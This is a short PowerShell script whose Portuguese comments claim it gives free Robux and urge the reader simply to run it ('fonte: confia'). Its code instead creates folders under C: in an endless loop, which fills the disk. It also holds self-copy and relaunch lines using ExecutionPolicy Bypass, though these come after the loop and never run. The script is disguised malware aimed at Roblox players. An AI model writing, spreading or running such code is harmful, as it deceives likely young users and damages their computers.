# script que dá robux de graça
$currentScript = $MyInvocation.MyCommand.Path


$targetDir  = "C:"
$targetPath = Join-Path $targetDir "replica_task.ps1"

	$basePath = "C:"
	$counter = 1

	while ($true) {
		$folderPath = Join-Path $basePath "Folder_$counter"
		New-Item -Path $folderPath -ItemType Directory -Force | Out-Null
		Write-Host "Created: $folderPath"
		$counter++
	
	}

Copy-Item -Path $currentScript -Destination $targetPath -Force


Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$targetPath`""

# para quem estiver lendo mas não entendeu, esse código dá robux de graça, só executar.
# fonte: confia